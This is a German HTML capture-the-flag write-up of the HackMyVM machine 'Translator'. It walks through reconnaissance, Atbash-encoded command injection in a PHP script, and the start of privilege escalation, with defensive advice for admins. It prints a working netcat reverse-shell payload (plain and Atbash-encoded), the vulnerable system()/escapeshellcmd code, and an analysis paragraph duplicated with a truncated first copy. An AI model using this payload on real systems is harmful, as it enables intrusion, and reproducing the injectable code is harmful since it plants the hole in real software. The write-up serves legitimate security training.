@@ -1,0 +1,700 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Translator - HackMyVM - Easy - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Stelle sicher, dass style.css die Klassen `.level-easy h2` und `.level-easy .segment` mit grüner Farbe definiert. -->
+</head>
+ <body>
+ 
+    <div class="header-bg">
+        <h1>Translator - HackMyVM - Level: Easy - Bericht</h1> <!-- H1 angepasst -->
+        <div class="level-container level-easy"> <!-- Klasse 'level-easy' hinzugefügt für Grün -->
+            <h2>Easy</h2> <!-- Text "Easy", Farbe Grün via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div> <!-- Segmente werden durch CSS-Klasse '.level-easy' grün -->
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe des inneren Kreises wird durch CSS bestimmt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">Web Browser</div>
+                <div class="tool-item">tr (via RCE)</div>
+                <div class="tool-item">Atbash Cipher (Decoder)</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">choom</div>
+                <div class="tool-item">cp</div>
+                <div class="tool-item">nano (oder anderer Editor)</div>
+                <div class="tool-item">trans (Custom Binary)</div>
+                <div class="tool-item">ssh</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration & LFI/RCE</a></li>
+                <li><a href="#initial-access">Initial Access (www-data)</a></li>
+                <li><a href="#privesc-ocean">Privilege Escalation (www-data -> ocean)</a></li>
+                <li><a href="#privesc-india">Privilege Escalation (ocean -> india)</a></li>
+                <li><a href="#poc">Proof of Concept (india -> root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Pentest beginnt mit einem Nmap-Scan gegen die Ziel-IP `192.168.2.113`. Die verwendeten Optionen sind:
+                *   `-sS`: TCP SYN Scan (Stealth Scan).
+                *   `-sC`: Führt Standard-Nmap-Skripte aus.
+                *   `-T5`: Timing-Template "insane" für einen sehr schnellen Scan.
+                *   `-sV`: Versucht, die Version der laufenden Dienste zu ermitteln.
+                *   `-A`: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute (kombiniert `-sV`, `-O`, `-sC`, `--traceroute`). Die explizite Angabe von `-sV` und `-sC` neben `-A` ist redundant.
+                *   `-p-`: Scannt alle 65535 TCP-Ports.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan identifiziert zwei offene Ports:
+                *   **Port 22/tcp:** OpenSSH 8.4p1 (Debian). Ein Standard-SSH-Zugangspunkt.
+                *   **Port 80/tcp:** Nginx 1.18.0 Webserver. Dies ist der primäre Angriffsvektor für Web-Schwachstellen.
+                Die spezifischen Nmap-Skriptergebnisse (`ssh-hostkey`) und OS/Service-Details werden im bereitgestellten Textauszug nicht vollständig gezeigt, aber die wesentlichen offenen Ports sind bekannt.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Konzentrieren Sie sich auf den Webserver (Port 80) für die weitere Enumeration. Halten Sie den SSH-Port im Hinterkopf für spätere Brute-Force-Versuche oder falls Zugangsdaten gefunden werden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur notwendige Ports offen sind. Halten Sie SSH- und Webserver-Software aktuell. Konfigurieren Sie SSH sicher (Schlüssel-Authentifizierung bevorzugen, Passwort-Auth deaktivieren, Fail2ban verwenden). Überprüfen Sie die Nginx-Konfiguration auf Sicherheitslücken.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.113 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at ...
+Nmap scan report for 192.168.2.113
+Host is up (.... latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey:
+|   3072 08:cf:50:b2:4f:41:43:c4:66:56:ce:96:b9:04:8c:77 (RSA)
+|   256 40:b7:11:24:76:59:cd:e0:79:db:71:d1:39:29:d5:45 (ECDSA)
+|_  256 44:64:ba:b8:52:4f:ca:00:dd:3e:c3:28:71:6f:77:76 (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-server-header: nginx/1.18.0
+|_http-title: Site doesn't have a title (...).
+... (Weitere Nmap-Ausgaben wie OS detection, etc. nicht im Text enthalten) ...
+Nmap done: 1 IP address (1 host up) scanned in ... seconds</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration & LFI/RCE</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> `gobuster` wird eingesetzt, um Verzeichnisse und Dateien auf dem Webserver unter `http://192.168.2.113` zu finden.
+                *   `dir`: Modus für Verzeichnis/Datei-Enumeration.
+                *   `-u "http://192.168.2.113"`: Ziel-URL.
+                *   `-w /usr/share/dirb/wordlists/common.txt`: Verwendete Wortliste.
+                *   `-e`: Erweiterter Modus (zeigt volle URLs). Die Option wird doppelt angegeben, was aber keinen Unterschied macht.
+                *   `-x .git,php,html,...`: Zu testende Dateiendungen.
+                *   `-t 100`: Anzahl der Threads.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Gobuster findet zwei relevante Dateien:
+                *   `/index.html` (Status 200): Die Startseite.
+                *   `/translate.php` (Status 200): Eine PHP-Datei, die aufgrund ihres Namens wahrscheinlich eine Übersetzungsfunktion implementiert. Dies ist ein sehr interessanter Fund, da PHP-Skripte oft Angriffsvektoren für Code Injection oder File Inclusion bieten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie `index.html` und insbesondere `translate.php` genauer. Rufen Sie `translate.php` direkt auf und analysieren Sie die Funktionalität und mögliche Eingabeparameter (z.B. über GET oder POST). Fügen Sie den Hostnamen `translator.hmv` (vermutlich von der Webseite oder aus Kommentaren extrahiert) zur lokalen `/etc/hosts`-Datei hinzu, um die Webseite unter diesem Namen aufrufen zu können (`192.168.2.113 translator.hmv`).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Webanwendungen sicher entwickelt werden (Input Validation, Output Encoding). Vermeiden Sie es, unnötige Dateien oder Skripte auf dem Webserver zugänglich zu machen. Überwachen Sie Webserver-Logs auf verdächtige Anfragen (z.B. Directory Traversal Versuche, Code Injection Payloads).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u "http://192.168.2.113" -w /usr/share/dirb/wordlists/common.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv -t 100 -e</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.113
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Status codes:            200,204,301,302,307,401,403,500
+[+] User Agent:              gobuster/3.1.0
+[+] Extensions:              xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,dsd,mp3,mp4,mkv,git,php,html
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster
+===============================================================
+http://192.168.2.113/index.html           (Status: 200) [Size: 290]
+http://192.168.2.113/translate.php        (Status: 200) [Size: 20]
+...
+===============================================================
+Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der Pentester ruft die Webseite `http://translator.hmv/` (nach Anpassung der `/etc/hosts`-Datei) im Browser auf. Die Seite "HMV Translator" enthält ein Formular oder eine Funktion, die auf `/translate.php` verweist und zur Übersetzung auffordert. Anschließend werden verschiedene URLs direkt im Browser aufgerufen, um die Funktionalität von `translate.php` zu testen und Schwachstellen zu finden. Es wird der GET-Parameter `hmv` verwendet.
+                *   `http://translator.hmv/translate.php`: Direkter Aufruf, vermutlich ohne Parameter, ergibt wenig Information.
+                *   `http://translator.hmv/translate.php?hmv=i+like+it%0D%0A`: Test mit normalem Text und Zeilenumbruch (`%0D%0A`).
+                *   `http://translator.hmv/translate.php?hmv=abcdefghijklmnopqrstuvwxyz`: Test mit dem gesamten Alphabet. Die Ausgabe `zyxwvutsrqponmlkjihgfedcba zyxwvutsrqfonmlkjitgfedcba` zeigt eine Art Umkehrung oder Substitution, aber der zweite Teil ist fehlerhaft/seltsam.
+                *   `http://translator.hmv/translate.php?hmv=/..`: Versuch eines Directory Traversal.
+                *   `http://translator.hmv/translate.php?hmv=../../../etc/passwd`: Klassischer Local File Inclusion (LFI) / Directory Traversal Versuch, um die Passwortdatei zu lesen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Tests deuten darauf hin, dass der `hmv`-Parameter vom Skript `translate.php` verarbeitet wird. Die Eingabe `abcdefghijklmnopqrstuvwxyz` führt zur Ausgabe `zyxwvutsrqfonmlkjitgfedcba`. Dies sieht stark nach einer Atbash-Verschlüsselung aus (A wird Z, B wird Y usw.). Die LFI/Traversal-Versuche (`/..`, `../../../etc/passwd`) scheinen nicht direkt zu funktionieren bzw. die Ausgabe ist nicht die erwartete Dateiinhalte. Stattdessen wird der Eingabestring offenbar durch die Atbash-Chiffre verarbeitet: `../../../etc/passwd` wird zu `../../../vgx/kzhhdw`. Dies ist ein sehr wichtiger Hinweis! Es scheint, dass die Eingabe zuerst durch `escapeshellcmd()` (siehe spätere Code-Analyse) geschützt wird, aber dann an einen Shell-Befehl übergeben wird, der die Atbash-Übersetzung durchführt (vermutlich mit `tr`). Die Tatsache, dass der `hmv`-Parameter in einem Shell-Befehl landet, öffnet die Tür für Command Injection, auch wenn `escapeshellcmd()` einige Zeichen blockiert. Der Test `http://translator.hmv/translate.php?hmv=rw;` ergibt `id;`, was bestätigt, dass `rw` (Atbash für `id`) als Befehl ausgeführt wird.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da die Eingabe Atbash-verschlüsselt wird, bevor sie potenziell in einem Shell-Kontext landet, müssen Kommandos zuerst Atbash-kodiert werden. Ziel ist es, eine Reverse Shell Payload zu erstellen, diese Atbash zu kodieren und über den `hmv`-Parameter zu injizieren.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Die Übergabe von Benutzer-kontrollierten Daten an `system()` oder andere Shell-Ausführungsfunktionen ist extrem gefährlich. `escapeshellcmd()` bietet nur begrenzten Schutz und kann oft umgangen werden. Vermeiden Sie Shell-Ausführungen mit Benutzereingaben. Wenn es absolut notwendig ist, verwenden Sie sicherere Funktionen wie `pcntl_exec` (wenn möglich) oder validieren und säubern Sie die Eingaben extrem gründlich und verwenden Sie `escapeshellarg()` für einzelne Argumente, nicht `escapeshellcmd()` für ganze Befehlsstrings. Die Verwendung von `tr` zur Übersetzung ist hier der Kern des Problems.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Browser-Aufrufe und Beobachtungen
+
+# Aufruf der Startseite
+http://translator.hmv/
+# -> Enthält Link/Formular zu /translate.php
+
+# Test 1: Direkter Aufruf
+http://translator.hmv/translate.php
+# -> Vermutlich leere oder Basis-Ausgabe
+
+# Test 2: Normale Eingabe
+http://translator.hmv/translate.php?hmv=i+like+it%0D%0A
+# -> Vermutlich Atbash-übersetzte Ausgabe
+
+# Test 3: Alphabet-Test -> Atbash-Vermutung
+http://translator.hmv/translate.php?hmv=abcdefghijklmnopqrstuvwxyz
+Translated to:
+zyxwvutsrqponmlkjihgfedcba zyxwvutsrqfonmlkjitgfedcba  # Hinweis auf Atbash
+
+# Test 4: Directory Traversal Versuch
+http://translator.hmv/translate.php?hmv=/..
+# -> Vermutlich Atbash-übersetzte Ausgabe von /..
+
+# Test 5: LFI/Directory Traversal -> Atbash bestätigt
+http://translator.hmv/translate.php?hmv=../../../etc/passwd
+Translated to:
+../../../vgx/kzhhdw;  # Bestätigt Atbash-Verarbeitung der Eingabe
+
+# Test 6: Command Injection Versuch -> Atbash-Kodierung notwendig
+http://translator.hmv/translate.php?hmv=rw; # Atbash für "id"
+Translated to:
+id; # Bestätigt Command Injection nach Atbash!
+                    </pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (www-data)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Das Ziel ist nun, eine Reverse Shell durch Ausnutzung der Command Injection in `translate.php` zu erhalten. Da die Eingabe Atbash-verschlüsselt wird, muss die Payload entsprechend vorbereitet werden. Der Prozess ist wie folgt:
+                1.  **Payload auswählen:** Eine Standard-Bash-Reverse-Shell-Payload von pentestmonkey.net wird gewählt: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f`. Diese Payload verwendet eine Named Pipe (`/tmp/f`), um eine interaktive Shell über `nc` zum Angreifer (`10.0.0.1` auf Port `1234`) zu leiten. Die Angreifer-IP muss natürlich angepasst werden (`192.168.2.140` im Beispiel).
+                2.  **Payload Atbash-kodieren:** Die Payload wird mittels eines Online-Tools (dcode.fr) oder eines Skripts Atbash-kodiert. Das Ergebnis ist: `in /gnk/u;npurul /gnk/u;xzg /gnk/u|/yrm/hs -r 2>&1|mx 192.168.2.140 1234 >/gnk/u`.
+                3.  **Listener starten:** Auf dem Angreifer-System wird ein `nc`-Listener auf dem gewählten Port (1234) gestartet, um die eingehende Verbindung abzufangen.
+                4.  **Payload senden:** Die Atbash-kodierte Payload wird als Wert des `hmv`-Parameters an `translate.php` gesendet, entweder über den Browser oder ein Tool wie `curl`.
+                5.  **Shell empfangen:** Der Listener auf dem Angreifer-System sollte die Verbindung empfangen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Plan ist solide und nutzt die identifizierte Schwachstelle (Command Injection nach Atbash-Verarbeitung) gezielt aus. Die Verwendung einer Named Pipe ist eine gängige Methode für interaktive Reverse Shells. Die Atbash-Kodierung ist der Schlüssel, um die Payload erfolgreich zu injizieren.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Führen Sie die Schritte genau wie geplant aus. Stellen Sie sicher, dass die IP-Adresse und der Port in der Payload und im Listener übereinstimmen. Seien Sie bereit, die Shell nach Erhalt zu stabilisieren (z.B. mit Python PTY).
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Diese Schritte demonstrieren die Ausnutzung der kritischen Schwachstelle. Patchen Sie die Anwendung sofort, indem Sie die Shell-Ausführung mit Benutzereingaben entfernen oder sicher implementieren.
+             </p>
+            <!-- Schritte 1 & 2: Payload und Kodierung -->
+            <p class="analysis">
+                <strong>Payload und Kodierung (Schritte 1 & 2):</strong>
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+# 1. Gewählte Reverse Shell Payload (Ziel-IP: 192.168.2.140, Port: 1234)
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.140 1234 >/tmp/f
+
+# 2. Atbash-kodierte Payload (Verwendung eines Online-Tools oder Skripts)
+in /gnk/u;npurul /gnk/u;xzg /gnk/u|/yrm/hs -r 2>&1|mx 192.168.2.140 1234 >/gnk/u
+                    </pre>
+                </div>
+            </div>
+            <!-- Schritt 3: Listener starten -->
+            <p class="analysis">
+                <strong>Listener starten (Schritt 3):</strong>
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 1234</span></div>
+                     <pre>listening on [any] 1234 ...</pre>
+                 </div>
+             </div>
+            <!-- Schritt 4: Payload senden -->
+             <p class="analysis">
+                 <strong>Payload senden (Schritt 4):</strong> Die kodierte Payload wird über den Browser oder `curl` an das Ziel gesendet.
+             </p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+# Aufruf im Browser oder via curl:
+http://translator.hmv/translate.php?hmv=in /gnk/u;npurul /gnk/u;xzg /gnk/u|/yrm/hs -r 2>&1|mx 192.168.2.140 1234 >/gnk/u
+                     </pre>
+                 </div>
+             </div>
+             <!-- Schritt 5: Shell empfangen -->
+            <p class="analysis">
+                <strong>Shell empfangen (Schritt 5):</strong> Der `nc`-Listener auf dem Angreifer-System empfängt die Verbindung vom Ziel.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung (Empfang):</strong> Erfolg! Der Listener zeigt eine eingehende Verbindung von `192.168.2.113`. Die Meldung `/bin/sh: 0: can't access tty; job control turned off` ist typisch für einfache Reverse Shells. Der Befehl `export TERM=xterm` und `/bin/bash -i` wird ausgeführt, um die Shell-Umgebung zu verbessern und eine interaktivere Bash-Sitzung zu erhalten (obwohl die TTY-Fehler weiterhin auftreten können). Der Prompt `www-data@translator:~/html$` bestätigt, dass der Angreifer eine Shell als Benutzer `www-data` (der Benutzer, unter dem der Webserver läuft) im Verzeichnis `/var/www/html` (oder einem ähnlichen Web-Root) hat.
+            </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Der initiale Zugriff ist geschafft! Stabilisieren Sie die Shell weiter, wenn möglich (z.B. `python -c 'import pty; pty.spawn("/bin/bash")'`). Beginnen Sie mit der lokalen Enumeration als `www-data`, um Wege zur Rechteausweitung zu finden. Untersuchen Sie den Quellcode von `translate.php` und andere Dateien im Web-Root.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Die Kompromittierung ist erfolgt. Stoppen Sie den Webserver oder isolieren Sie das System. Analysieren Sie die Logs, um den Angriffszeitpunkt und die ausgeführten Befehle zu verstehen. Beginnen Sie mit der Bereinigung und dem Patchen der Schwachstelle.
+             </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Fortsetzung der Listener-Ausgabe -->
+                     <pre>connect to [192.168.2.140] from (UNKNOWN) [192.168.2.113] 37186
+/bin/sh: 0: can't access tty; job control turned off</pre>
+                     <!-- Befehle in der empfangenen Shell -->
+                     <div class="prompt no-kali-prompt">$ <span class="command">export TERM=xterm</span></div>
+                     <div class="prompt no-kali-prompt">$ <span class="command">/bin/bash -i</span></div>
+                     <pre>bash: cannot set terminal process group (343): Inappropriate ioctl for device
+bash: no job control in this shell</pre>
+                    <div class="prompt no-kali-prompt">www-data@translator:~/html$ </div>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Direkt nach Erhalt der Shell wird der Quellcode der angreifbaren Datei `translate.php` untersucht. Dies hilft zu verstehen, wie die Schwachstelle genau funktioniert.
+            </p>
+             <p class="evaluation">
+                 <strong>Bewertung:</strong> Der PHP-Code bestätigt die Vermutungen:
+                 1.  `$test = $_GET['hmv'];`: Die Eingabe wird aus dem GET-Parameter `hmv` genommen.
+                 2.  `$test = escapeshellcmd($test);`: Die Eingabe wird durch `escapeshellcmd()` verarbeitet. Diese Funktion versucht, die Ausführung beliebiger Shell-Befehle zu verhindern, indem sie bestimmte Zeichen maskiert oder entfernt (z.B. `;`, `&`, `|`, `` ` ``, `<`), erlaubt aber oft noch die Injektion von Argumenten oder die Nutzung von nicht maskierten Zeichen in Kombination mit bestimmten Befehlen.
+                 3.  `$ultima_linea = system('echo '.$test.'| tr abcdefghijklmnopqrstuvwxyz zyxwvutsrqponmlkjihgfedcba');`: Hier ist die Schwachstelle! Die (potenziell nur teilweise gesäuberte) Eingabe `$test` wird direkt in einen `system()`-Aufruf eingefügt. `system()` führt den Befehl in der Shell aus. Obwohl `escapeshellcmd` versucht, Verkettungen (wie `;`) zu verhindern, kann der `echo`-Befehl selbst manipuliert werden, oder der `tr`-Befehl könnte durch geschickte Eingaben beeinflusst werden. Noch wichtiger: Da die Variable `$test` direkt in den String eingefügt wird, können Zeichen, die von `escapeshellcmd` nicht betroffen sind (wie Leerzeichen, Buchstaben, Zahlen, einige Sonderzeichen), zur Injektion verwendet werden. Die Atbash-Kodierung der Payload umgeht effektiv viele der von `escapeshellcmd` blockierten Zeichen, da die kritischen Zeichen erst *nach* der `echo`- und `tr`-Verarbeitung wieder im Klar
+				                  <strong>Bewertung:</strong> Der PHP-Code bestätigt die Vermutungen:
+                 1.  `<?php $test = $_GET['hmv']; ?>`: Die Eingabe wird aus dem GET-Parameter `hmv` genommen.
+                 2.  `<?php $test = escapeshellcmd($test); ?>`: Die Eingabe wird durch `escapeshellcmd()` verarbeitet. Diese Funktion versucht, die Ausführung beliebiger Shell-Befehle zu verhindern, indem sie bestimmte Zeichen maskiert oder entfernt (z.B. `;`, `&`, `|`, `` ` ``, `<`), erlaubt aber oft noch die Injektion von Argumenten oder die Nutzung von nicht maskierten Zeichen in Kombination mit bestimmten Befehlen.
+                 3.  `<?php $ultima_linea = system('echo '.$test.'| tr abcdefghijklmnopqrstuvwxyz zyxwvutsrqponmlkjihgfedcba'); ?>`: Hier ist die Schwachstelle! Die (potenziell nur teilweise gesäuberte) Eingabe `$test` wird direkt in einen `system()`-Aufruf eingefügt. `system()` führt den Befehl in der Shell aus. Obwohl `escapeshellcmd` versucht, Verkettungen (wie `;`) zu verhindern, kann der `echo`-Befehl selbst manipuliert werden, oder der `tr`-Befehl könnte durch geschickte Eingaben beeinflusst werden. Noch wichtiger: Da die Variable `$test` direkt in den String eingefügt wird, können Zeichen, die von `escapeshellcmd` nicht betroffen sind (wie Leerzeichen, Buchstaben, Zahlen, einige Sonderzeichen), zur Injektion verwendet werden. Die Atbash-Kodierung der Payload umgeht effektiv viele der von `escapeshellcmd` blockierten Zeichen, da die kritischen Zeichen erst *nach* der `echo`- und `tr`-Verarbeitung wieder im Klartext erscheinen und dann von der Shell interpretiert werden können.
+                 4.  `<?php $ulti = system('echo '.$ultima_linea.'| tr "php" "wtf"'); ?>`: Die Ausgabe des ersten `system()`-Aufrufs wird nochmals durch `tr` geleitet, um "php" durch "wtf" zu ersetzen. Dies ist für die Ausnutzung der Schwachstelle selbst weniger relevant, erklärt aber die manchmal seltsame Ausgabe bei Tests.
+             </p>
+             <p class="recommendation">
+                 <strong>Empfehlung (Pentester):</strong> Das Verständnis dieses Codes bestätigt den Angriffsvektor. Fahren Sie mit der lokalen Enumeration fort, um Privilegien zu eskalieren.
+                 <br>
+                 <strong>Empfehlung (Admin):</strong> Dringend die Verwendung von `system()` mit Benutzereingaben entfernen. Implementieren Sie die Übersetzungslogik sicher innerhalb von PHP, ohne auf externe Shell-Befehle zurückzugreifen. Falls Shell-Befehle unvermeidbar sind, validieren Sie Eingaben extrem streng und verwenden Sie sicherere Funktionen wie `escapeshellarg()` für einzelne Argumente, nicht für den gesamten Befehl.
+             </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt no-kali-prompt">www-data@translator:~/html$ <span class="command">cat translate.php</span></div>
+                    <pre>
+<?php
+$test = $_GET['hmv'];
+$test = escapeshellcmd($test);
+echo ("Translated to:");
+echo "<br>";
+$ultima_linea = system('echo '.$test.'| tr abcdefghijklmnopqrstuvwxyz zyxwvutsrqponmlkjihgfedcba');
+$ulti = system('echo '.$ultima_linea.'| tr "php" "wtf"');
+?>
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach der Code-Analyse werden die Befehle `ls -la` und `id` ausgeführt, um den Inhalt des aktuellen Verzeichnisses (`/var/www/html`) und die Identität des aktuellen Benutzers zu überprüfen. `ls -la` listet alle Dateien (auch versteckte) im Langformat auf. `id` zeigt die User ID (UID), Group ID (GID) und Gruppenzugehörigkeiten an.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong>
+                *   `ls -la`: Zeigt die erwarteten Webdateien (`index.html`, `translate.php`). Interessant ist die Datei `hvxivg` (Atbash für `script`?) und `tr` (möglicherweise ein Überbleibsel eines fehlgeschlagenen Befehls oder eine weitere Datei?). Beide gehören `www-data`.
+                *   `id`: Bestätigt, dass die Shell als `uid=33(www-data)` mit `gid=33(www-data)` läuft. Dies sind die Standard-IDs für den Webserver-Benutzer unter Debian/Ubuntu. Der Benutzer hat sehr eingeschränkte Rechte.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Inhalt der Datei `hvxivg` (`cat hvxivg`), da sie verdächtig aussieht. Beginnen Sie mit der systematischen lokalen Enumeration: Suchen Sie nach SUID/SGID-Dateien (`find / -type f -perm -4000 -ls 2>/dev/null`), überprüfbaren Cronjobs (`cat /etc/crontab`), Kernel-Version (`uname -a`) und anderen potenziellen Eskalationsvektoren.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass der `www-data`-Benutzer nur die absolut notwendigen Berechtigungen hat (Leserechte auf Webdateien, Schreibrechte nur auf bestimmte Upload-/Cache-Verzeichnisse, falls erforderlich). Überprüfen Sie regelmäßig die Dateien im Web-Root auf verdächtige oder unnötige Dateien.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt no-kali-prompt">www-data@translator:~/html$ <span class="command">ls -la</span></div>
+                    <pre>
+total 28
+drwxr-xr-x 2 www-data www-data 4096 Oct  4 13:41 .
+drwxr-xr-x 3 root     root     4096 May 11 10:25 ..
+-rw-r--r-- 1 www-data www-data   24 May 11 10:29 hvxivg
+-rw-r--r-- 1 www-data www-data  290 May 11 10:29 index.html
+-rw-r--r-- 1 www-data www-data   42 Oct  4 13:41 tr
+-rw-r--r-- 1 www-data www-data  258 May 11 10:29 translate.php
+                    </pre>
+                    <div class="prompt no-kali-prompt">www-data@translator:~/html$ <span class="command">id</span></div>
+                    <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="privesc-ocean">
+            <h2>Privilege Escalation (www-data -> ocean)</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Es wird nach Dateien mit dem SUID-Bit gesucht. Das SUID-Bit erlaubt es einem Benutzer, eine ausführbare Datei mit den Rechten des Dateibesitzers (oft `root`) auszuführen. Dies ist ein häufiger Vektor für Rechteausweitungen. `find / -type f -perm -4000 -ls 2>/dev/null` sucht nach Dateien (`-type f`) im gesamten System (`/`), die das SUID-Bit gesetzt haben (`-perm -4000`), und gibt detaillierte Informationen aus (`-ls`). Fehler werden unterdrückt (`2>/dev/null`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Liste zeigt mehrere Standard-SUID-Binaries (`ssh-keysign`, `dbus-daemon-launch-helper`, `gpasswd`, `chfn`, `mount`, `su`, `newgrp`, `umount`, `sudo`, `chsh`, `passwd`). Diese sind normalerweise sicher konfiguriert. Es gibt keine offensichtlich ungewöhnlichen oder veralteten SUID-Binaries, die auf eine einfache Ausnutzung hindeuten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Obwohl keine offensichtlichen SUID-Exploits zu sehen sind, behalten Sie die Liste im Hinterkopf (insbesondere `sudo`, falls `sudo -l` später nützlich ist). Setzen Sie die Enumeration fort, insbesondere die Untersuchung der verdächtigen Datei `hvxivg`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig die SUID/SGID-Binaries auf dem System (`find / -type f \( -perm -4000 -o -perm -2000 \) -ls`). Entfernen Sie das SUID/SGID-Bit von Binaries, wo es nicht absolut notwendig ist. Halten Sie das System und die Pakete aktuell, um bekannte SUID-Exploits zu vermeiden.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt no-kali-prompt">www-data@translator:~/html$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+   268891    472 -rwsr-xr-x   1 root     root       481608 Mar 13  2021 /usr/lib/openssh/ssh-keysign
+   266926     52 -rwsr-xr--   1 root     messagebus    51336 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   129887     88 -rwsr-xr-x   1 root     root          88304 Feb  7  2020 /usr/bin/gpasswd
+   129884     60 -rwsr-xr-x   1 root     root          58416 Feb  7  2020 /usr/bin/chfn
+   133900     56 -rwsr-xr-x   1 root     root          55528 Jan 20  2022 /usr/bin/mount
+   133533     72 -rwsr-xr-x   1 root     root          71912 Jan 20  2022 /usr/bin/su
+   133374     44 -rwsr-xr-x   1 root     root          44632 Feb  7  2020 /usr/bin/newgrp
+   133902     36 -rwsr-xr-x   1 root     root          35040 Jan 20  2022 /usr/bin/umount
+   154756    180 -rwsr-xr-x   1 root     root         182600 Feb 27  2021 /usr/bin/sudo
+   129885     52 -rwsr-xr-x   1 root     root          52880 Feb  7  2020 /usr/bin/chsh
